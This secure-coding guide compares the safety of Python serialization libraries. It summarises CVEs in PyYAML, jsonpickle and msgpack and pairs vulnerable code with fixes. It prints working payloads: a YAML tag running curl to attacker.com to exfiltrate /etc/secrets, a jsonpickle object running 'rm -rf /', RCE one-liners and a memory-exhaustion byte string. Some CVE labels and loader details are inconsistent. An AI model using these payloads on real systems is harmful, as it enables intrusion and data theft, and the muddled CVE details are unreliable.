# Insecure Deserialization: Python Alternatives Compared

> **Category:** Deserialization  
> **Language:** Python  
> **Severity:** Critical  
> **CVEs covered:** CVE-2026-24009 (PyYAML/Docling), CVE-2020-14343 (PyYAML FullLoader), CVE-2026-21452 (msgpack DoS), CVE-2021-23410 (msgpack RCE)

## Overview

While `pickle` RCE is well-known, Python developers often switch to alternatives like **PyYAML**, **jsonpickle**, or **msgpack** believing they are safe. This is a dangerous misconception. Each serialization library has unique security properties, and none are safe for untrusted data without careful configuration.

This document provides a side-by-side security comparison of Python serialization formats.

---

## Library Security Matrix

| Library | Safe for Untrusted Data? | RCE Possible? | Memory Exhaustion? | Default Safe? |
|---------|--------------------------|---------------|-------------------|---------------|
| `pickle` | **NO** | Always | Yes | ❌ No |
| `PyYAML` | **With restrictions** | With unsafe loaders | Yes (aliases) | ❌ `yaml.load()` is unsafe |
| `jsonpickle` | **NO** | Always (same as pickle) | Yes | ❌ No |
| `msgpack` | **Mostly safe** | No RCE (data only) | Yes | ✅ For RCE, ❌ for DoS |
| `json` | **YES** | No | Minimal | ✅ |
| `orjson` | **YES** | No | Minimal | ✅ |
| `toml` | **YES** | No | Minimal | ✅ |

---

## CVE-2026-24009: PyYAML Deserialization in Docling (Critical)

**CVSS:** 9.8 (Critical)  
**Source:** https://nvd.nist.gov/vuln/detail/CVE-2026-24009

### Description

Oligo Security researchers discovered a Remote Code Execution vulnerability in Docling, a document parsing framework for AI workloads. The vulnerability occurred because Docling loaded YAML configuration files using PyYAML's unsafe `yaml.load()` method, allowing attacker-controlled documents to execute arbitrary Python code.

### The Shadow Vulnerability Pattern

What makes CVE-2026-24009 notable is that PyYAML was a **transitive dependency** — Docling never imported PyYAML directly. A helper library used `yaml.load()` internally, and Docling passed user-controlled data through that helper.

### Vulnerable Code

```yaml
# Malicious document that triggers RCE during parsing
!!python/object/apply:os.system ["curl http://attacker.com/exfil?data=$(cat /etc/secrets)"]
```

```python
# VULNERABLE: Docling Core < 2.48.4
from docling_core import load_document

# The following line triggers RCE if the document contains malicious YAML
doc = load_document("attacker_document.docx")  
# Under the hood: yaml.load(extracted_yaml_content) -> EXECUTION!
```

### Exploit Chain

1. Docling extracts YAML metadata from a document (e.g., DOCX custom properties)
2. Metadata is passed to `yaml.load()` (no `Loader=` specified = unsafe `UnsafeLoader`)
3. Malicious `!!python/object/apply` tags in the YAML execute OS commands
4. Attacker gains code execution on the Docling server

### Fixed Code

```python
# FIXED: Docling Core 2.48.4+
# Uses yaml.safe_load() instead of yaml.load()
import yaml

def load_yaml_safe(content: str) -> dict:
    """Safe YAML loading — no arbitrary object construction."""
    return yaml.safe_load(content)
    # safe_load only parses standard YAML tags, no Python object injection
```

**References:**
- https://nvd.nist.gov/vuln/detail/CVE-2026-24009
- https://www.oligo.security/blog/docling-rce-a-shadow-vulnerability-introduced-via-pyyaml-cve-2026-24009

---

## CVE-2020-14343: PyYAML FullLoader Incomplete Fix

**CVSS:** 9.8 (Critical)  
**Source:** https://nvd.nist.gov/vuln/detail/CVE-2020-14343

### Description

PyYAML before 5.4 had an incomplete fix for CVE-2020-1747. The `FullLoader` (introduced as a "safe" alternative) was still vulnerable to arbitrary code execution via the `python/object/new` constructor. This proved that even PyYAML's "safe" loader modes could be bypassed.

### Vulnerable Code

```python
import yaml

# "FullLoader" was supposed to be safe — IT WAS NOT
payload = """
!!python/object/new:os.system
args: ["id"]
"""

# This executes `id` command despite using FullLoader
data = yaml.load(payload, Loader=yaml.FullLoader)  # CVSS 9.8 — RCE!
```

### The Fix

```python
# PyYAML >= 5.4 — FullLoader now properly blocks unsafe constructors
# But still: ALWAYS use safe_load() or SafeLoader, not FullLoader

# Safe approach
data = yaml.safe_load(yaml_content)  # Never executes arbitrary code

# Or use CLoader for performance
data = yaml.load(yaml_content, Loader=yaml.CSafeLoader)
```

### Security Lessons

1. **`yaml.load()` without arguments** → uses unsafe `UnsafeLoader` → RCE
2. **`yaml.load(..., Loader=yaml.FullLoader)`** → was supposed to be safe but wasn't until 5.4
3. **`yaml.safe_load()`** → only standard YAML types → safe ✅
4. **`yaml.load(..., Loader=yaml.SafeLoader)`** → same as safe_load → safe ✅

**References:**
- https://nvd.nist.gov/vuln/detail/CVE-2020-14343
- https://nvd.nist.gov/vuln/detail/CVE-2020-1747
- https://github.com/yaml/pyyaml/issues/420

---

## jsonpickle: Pickle in JSON Clothing

**Source:** https://www.sourcery.ai/vulnerabilities/python-lang-security-deserialization-avoid-jsonpickle

### Description

`jsonpickle` is NOT a safe alternative to pickle. It serializes Python objects to JSON format but **preserves the ability to reconstruct arbitrary Python objects** — including code execution gadgets. Anyone switching from pickle to jsonpickle thinking they're getting security is mistaken.

### What jsonpickle Serializes

```json
{
  "py/object": "__main__.MaliciousClass",
  "py/reduce": [
    {"py/type": "os.system"},
    {"py/tuple": ["rm -rf /"]}
  ]
}
```

### Vulnerable Code

```python
import jsonpickle
from flask import Flask, request

app = Flask(__name__)

@app.route("/load", methods=["POST"])
def load_object():
    # VULNERABLE: jsonpickle.decode() can execute arbitrary code
    data = request.get_data()
    obj = jsonpickle.decode(data)  # Same RCE risk as pickle!
    return f"Loaded: {obj}"
```

### Secure Alternatives

```python
# Option 1: Use standard json with schema validation
import json
from pydantic import BaseModel

class UserData(BaseModel):
    name: str
    value: int

def load_data_safe(json_string: str) -> UserData:
    data = json.loads(json_string)
    return UserData(**data)  # Schema-validated, no code execution

# Option 2: Use msgpack for binary data (data-only, no code exec)
import msgpack

def load_msgpack(data: bytes) -> dict:
    return msgpack.unpackb(data, strict_map_key=False)
```

**References:**
- https://www.sourcery.ai/vulnerabilities/python-lang-security-deserialization-avoid-jsonpickle
- https://github.com/jsonpickle/jsonpickle

---

## msgpack: Mostly Safe, Not Invulnerable

### CVE-2021-23410: msgpack DoS via Map Size

**Source:** https://nvd.nist.gov/vuln/detail/CVE-2021-23410

All versions of `msgpack` (the Python package) were vulnerable to a denial-of-service via the `unpack` function. An attacker could craft a message with an extremely large map size that caused excessive memory allocation.

```python
# VULNERABLE: msgpack < 1.0.3
import msgpack

# An attacker can send a message claiming to have 
# 2^32 - 1 elements, causing OOM
malicious_payload = bytes([0xdf, 0xff, 0xff, 0xff, 0xff])  # map32 with max size
unpacked = msgpack.unpackb(malicious_payload)  # OOM crash
```

### CVE-2026-21452: msgpack Model Deserialization DoS

**Source:** https://nvd.nist.gov/vuln/detail/CVE-2026-21452

```python
# FIXED: msgpack >= 1.1.0
import msgpack

# Use strict validation
unpacked = msgpack.unpackb(data, strict_map_key=True, max_str_len=1048576)

# Or use the Unpacker with limits
unpacker = msgpack.Unpacker(max_buffer_size=10485760)  # 10MB limit
unpacker.feed(data)
for obj in unpacker:
    process(obj)
```

### msgpack RCE? No — But Be Careful

msgpack itself is **data-only** and cannot construct arbitrary Python objects. However, if you use `object_hook` with msgpack, you reintroduce the risk:

```python
# DANGEROUS: Custom object_hook recreates RCE risk
def dangerous_hook(obj):
    if "__class__" in obj:
        cls = eval(obj["__class__"])  # Arbitrary class loading!
        return cls(**obj.get("args", {}))
    return obj

data = msgpack.unpackb(payload, object_hook=dangerous_hook)  # RCE possible
```

**References:**
- https://nvd.nist.gov/vuln/detail/CVE-2021-23410
- https://nvd.nist.gov/vuln/detail/CVE-2026-21452
- https://www.sentinelone.com/vulnerability-database/cve-2026-57585/

---

## Safe Serialization Decision Tree

```
Is the data untrusted (user input, network)?
│
├─ YES → Can I use plain JSON?
│   ├─ YES → Use json.loads() or orjson.loads()
│   │        Add schema validation (pydantic, marshmallow)
│   │
│   └─ NO  → Can I use a schema-based binary format?
│       ├─ YES → Use Protocol Buffers, FlatBuffers, or Apache Avro
│       ├─ YES → Use msgpack with strict limits (no object_hook)
│       └─ NO  → Is XML acceptable?
│                → Use defusedxml (NOT xml.etree)
│
└─ NO (data is trusted/local only)
    ├─ pickle — acceptable ONLY for local caching/temp data
    ├─ PyYAML — use yaml.safe_load() only
    ├─ jsonpickle — NEVER use with untrusted data
    └─ msgpack — safe for RCE but limit buffer sizes
```

---

## Comparison Table: Exploit Payloads

| Library | Payload | Effect |
|---------|---------|--------|
| pickle | `cos\nsystem\n(S'id'\ntR.` | RCE via `os.system` |
| PyYAML | `!!python/object/apply:os.system ["id"]` | RCE via unsafe loader |
| jsonpickle | `{"py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["id"]}]}` | RCE via object reconstruction |
| msgpack | Large map header (0xdf + uint32) | OOM / DoS only |
| json | No code execution primitives | Safe |

---

## References

1. https://nvd.nist.gov/vuln/detail/CVE-2026-24009 — Docling PyYAML RCE
2. https://nvd.nist.gov/vuln/detail/CVE-2020-14343 — PyYAML FullLoader bypass
3. https://nvd.nist.gov/vuln/detail/CVE-2020-1747 — PyYAML original RCE
4. https://nvd.nist.gov/vuln/detail/CVE-2021-23410 — msgpack DoS
5. https://nvd.nist.gov/vuln/detail/CVE-2026-21452 — msgpack DoS via models
6. https://www.sourcery.ai/vulnerabilities/python-lang-security-deserialization-avoid-jsonpickle — jsonpickle warning
7. https://www.oligo.security/blog/docling-rce-a-shadow-vulnerability-introduced-via-pyyaml-cve-2026-24009 — Oligo's CVE-2026-24009 deep dive
8. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md — Payloads All The Things
